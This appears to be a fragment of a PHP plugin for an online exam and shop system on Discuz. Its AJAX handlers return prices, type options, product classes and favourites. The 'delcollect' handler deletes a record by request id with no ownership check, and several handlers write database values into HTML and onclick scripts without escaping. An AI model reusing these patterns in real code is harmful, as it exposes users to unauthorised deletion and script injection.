				$goodspricestr.=' <del style="color:#999;font-size:12px"><em style="font-size:12px">&yen;</em>'.$it618_exam_goods_type['it618_price'].'</del>';
			}
		}
		
		if($it618_exam_goods_type['it618_xgcount']>0){
			if($it618_exam_goods_type['it618_xgtime']>0){
				$tmpxgstr='('.$it618_exam_lang['t24'].$it618_exam_goods_type['it618_xgtime'].$it618_exam_lang['t25'].$it618_exam_goods_type['it618_xgcount'].$it618_exam_lang['t57'].')';
			}else{
				$tmpxgstr='('.$it618_exam_lang['t71'].$it618_exam_goods_type['it618_xgcount'].$it618_exam_lang['t57'].')';
			}
		}

		$salecount=$it618_exam_goods_type['it618_salecount'];
		
		if($_GET['wap']==1){
			echo $goodspricestr.'it618_split<font color=#999>'.$it618_exam_lang['s1067'].' <font style="color:red">'.$it618_exam_goods_type['it618_count'].'</font></font>it618_split'.$it618_exam_goods_type['id'].'it618_split'.$tmpxgstr;
		}else{
			echo $goodspricestr.'it618_split<font color=#999>'.$it618_exam_lang['s1067'].' <font style="color:red">'.$it618_exam_goods_type['it618_count'].'</font> '.$tmpxgstr.'</font>it618_split'.$it618_exam_goods_type['id'].'it618_split'.$it618_exam_goods_type['it618_price'];
		}
	}else{
		echo 'reload';
	}
	exit;
}


if($_GET['ac']=="getgoodstypename1"){
	$n=0;
	foreach(C::t('#it618_exam#it618_exam_goods_type')->fetch_name1_by_it618_pid_name($_GET['pid'],it618_exam_utftogbk($_GET['gtypename'])) as $it618_exam_goods_type) {
		$tmpstr='';
		if($n==0){
			$tmpstr='class="current"';
			$goodstypename1=$it618_exam_goods_type['it618_name1'];
		}
		$goodstypestr1.='<a '.$tmpstr.' href="javascript:void(0)" onclick="setselect(\'goodstype1\','.$n.',\''.$it618_exam_goods_type['it618_name1'].'\')" name="goodstype1"><span>'.$it618_exam_goods_type['it618_name1'].'</span><i></i></a>';
		$n++;
	}
	
	if($goodstypestr1!=''){
		echo $goodstypestr1.'it618_split'.$goodstypename1;
	}else{
		echo '';
	}
	exit;
}


if($_GET['ac']=="examstyle"){
	$examstyle=getcookie('examstyle');
	if($examstyle==''){
		if($it618_exam['exam_style']==3)$examstyle='1';else $examstyle='2';
	}
	if($examstyle=='1')$examstyle='2';else $examstyle='1';
	dsetcookie('examstyle',$examstyle);
	echo 'ok';
	exit;
}


if($_GET['ac']=="getproductclass"){
	$n=1;
	$classtmp='<a class="current" href="javascript:void(0)" onclick="setselect(\'productclass2\',0,0)" name="productclass2"><span>'.$it618_exam_lang['s466'].'</span><i></i></a>';
	foreach(C::t('#it618_exam#it618_exam_class2')->fetch_all_by_it618_class1_id($_GET['cid']) as $it618_tmp) {	
		$classtmp.='<a href="javascript:void(0)" onclick="setselect(\'productclass2\','.$n.','.$it618_tmp['id'].')" name="productclass2"><span>'.$it618_tmp['it618_classname'].'</span><i></i></a>';
		$n=$n+1;
	}
	echo $classtmp;
	exit;
}


if($_GET['ac']=="getcollect"){
	if($uid>0){
		$count=C::t('#it618_exam#it618_exam_collect')->count_by_uid_pid($uid,$_GET['pid']);
		if($count>0){
			C::t('#it618_exam#it618_exam_collect')->delete_by_uid_pid($uid,$_GET['pid']);
			echo '2';
		}else{
			C::t('#it618_exam#it618_exam_collect')->insert(array(
				'it618_uid' => $uid,
				'it618_pid' => $_GET['pid'],
				'it618_time' => $_G['timestamp']
			), true);
			echo '1';
		}
	}
}


if($_GET['ac']=="delcollect"){
	if($uid>0){
		C::t('#it618_exam#it618_exam_collect')->delete_by_id($_GET['cid']);
		echo $it618_exam_lang['s1656'];
	}
}
//From: di'.'sm.t'.'aoba'.'o.com
?>